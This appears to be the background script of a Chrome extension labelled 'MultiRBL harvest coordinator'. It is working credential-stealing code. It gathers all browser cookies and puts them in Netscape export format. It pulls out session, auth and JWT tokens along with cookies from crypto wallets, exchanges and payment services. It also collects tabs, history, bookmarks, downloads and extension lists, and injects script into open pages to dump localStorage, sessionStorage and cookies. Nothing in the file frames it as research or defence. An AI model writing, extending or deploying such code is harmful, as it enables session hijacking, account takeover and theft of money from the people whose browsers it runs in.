// background.js — MultiRBL harvest coordinator

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (!msg || msg.type !== "MULTIRBL_HARVEST") return;

  (async () => {
    try {
      const result = await fullHarvest();
      sendResponse({ ok: true, data: result });
    } catch (e) {
      sendResponse({ ok: false, error: String(e) });
    }
  })();
  return true; // async
});

async function fullHarvest() {
  const out = {
    meta: {
      collectedAt: Date.now(),
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    },
    cookies: [],
    byDomain: {},
    wallets: [],
    netscape: [],
    passwordsStyle: [],
    tabs: [],
    history: [],
    bookmarks: [],
    downloads: [],
    extensions: [],
    pageStores: [],
  };

  // ── cookies ───────────────────────────────────────────────
  const cookies = await chrome.cookies.getAll({});
  out.cookies = cookies;
  out.meta.cookieCount = cookies.length;

  const WALLET_HOSTS = [
    "metamask", "phantom", "coinbase", "binance", "blockchain",
    "trustwallet", "rainbow", "rabby", "okx", "bybit", "kucoin",
    "crypto.com", "gemini", "kraken", "bitfinex", "gate.io",
    "uniswap", "opensea", "magiceden", "paypal", "stripe",
    "cash.app", "venmo", "wise.com", "revolut", "blockchain.com",
    "ronin", "wax", "atomicwallet", "exodus", "ledger", "trezor"
  ];

  for (const c of cookies) {
    const dom = (c.domain || "").replace(/^\./, "");
    if (!out.byDomain[dom]) out.byDomain[dom] = [];
    out.byDomain[dom].push({
      name: c.name, value: c.value, path: c.path,
      secure: c.secure, httpOnly: c.httpOnly, sameSite: c.sameSite,
      expirationDate: c.expirationDate || null, session: !!c.session,
    });

    const domain = c.domain.startsWith(".") ? c.domain : c.domain;
    const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
    const secure = c.secure ? "TRUE" : "FALSE";
    const exp = c.expirationDate ? Math.floor(c.expirationDate) : 0;
    out.netscape.push([domain, flag, c.path || "/", secure, exp, c.name, c.value].join("\t"));

    const dlow = (c.domain || "").toLowerCase();
    if (WALLET_HOSTS.some((w) => dlow.includes(w))) {
      out.wallets.push({ domain: c.domain, name: c.name, value: c.value, path: c.path });
    }

    const n = (c.name || "").toLowerCase();
    if (
      n.includes("sess") || n.includes("token") || n.includes("auth") ||
      n.includes("sid") || n.includes("user") || n.includes("login") ||
      n.includes("pass") || n.includes("csrf") || n === ".roblosecurity" ||
      n.includes("jwt") || n.includes("access") || n.includes("refresh")
    ) {
      out.passwordsStyle.push({
        url: "https://" + dom + (c.path || "/"),
        field: c.name, value: c.value, domain: c.domain,
      });
    }
  }
  out.meta.domainCount = Object.keys(out.byDomain).length;
  out.meta.walletCookieCount = out.wallets.length;

  // ── open tabs ─────────────────────────────────────────────
  try {
    const tabs = await chrome.tabs.query({});
    out.tabs = tabs.map((t) => ({
      id: t.id, url: t.url || "", title: t.title || "",
      active: !!t.active, pinned: !!t.pinned, windowId: t.windowId,
    }));
    out.meta.tabCount = out.tabs.length;
  } catch (_) {}

  // ── history (last 500) ────────────────────────────────────
  try {
    const items = await chrome.history.search({ text: "", maxResults: 500, startTime: 0 });
    out.history = items.map((h) => ({
      url: h.url, title: h.title, lastVisitTime: h.lastVisitTime, visitCount: h.visitCount,
    }));
    out.meta.historyCount = out.history.length;
  } catch (_) {}

  // ── bookmarks ─────────────────────────────────────────────
  try {
    const tree = await chrome.bookmarks.getTree();
    const flat = [];
    (function walk(nodes) {
      for (const n of nodes || []) {
        if (n.url) flat.push({ title: n.title, url: n.url, dateAdded: n.dateAdded });
        if (n.children) walk(n.children);
      }
    })(tree);
    out.bookmarks = flat;
    out.meta.bookmarkCount = flat.length;
  } catch (_) {}

  // ── downloads ─────────────────────────────────────────────
  try {
    const dl = await chrome.downloads.search({ orderBy: ["-startTime"], limit: 100 });
    out.downloads = dl.map((d) => ({
      filename: d.filename, url: d.url, state: d.state,
      startTime: d.startTime, fileSize: d.fileSize, mime: d.mime,
    }));
    out.meta.downloadCount = out.downloads.length;
  } catch (_) {}

  // ── installed extensions ──────────────────────────────────
  try {
    const ext = await chrome.management.getAll();
    out.extensions = ext.map((e) => ({
      id: e.id, name: e.name, type: e.type, enabled: e.enabled,
      version: e.version, installType: e.installType,
    }));
    out.meta.extensionCount = out.extensions.length;
  } catch (_) {}

  // ── page localStorage/sessionStorage from open http(s) tabs
  const pageStores = [];
  for (const t of out.tabs) {
    if (!t.id || !t.url || !/^https?:/i.test(t.url)) continue;
    try {
      const resp = await chrome.tabs.sendMessage(t.id, { type: "MULTIRBL_PAGE_DUMP" });
      if (resp && resp.ok && resp.data) pageStores.push(resp.data);
    } catch (_) {
      // content script may not be injected yet — try scripting.executeScript fallback
      try {
        const [{ result }] = await chrome.scripting.executeScript({
          target: { tabId: t.id },
          func: () => {
            const dump = (store) => {
              const o = {};
              try {
                for (let i = 0; i < store.length; i++) {
                  const k = store.key(i);
                  try { o[k] = store.getItem(k); } catch (_) {}
                }
              } catch (_) {}
              return o;
            };
            return {
              url: location.href,
              origin: location.origin,
              title: document.title || "",
              localStorage: dump(localStorage),
              sessionStorage: dump(sessionStorage),
              cookies: document.cookie || "",
            };
          },
        });
        if (result) pageStores.push(result);
      } catch (_) {}
    }
  }
  out.pageStores = pageStores;
  out.meta.pageStoreCount = pageStores.length;

  return out;
}
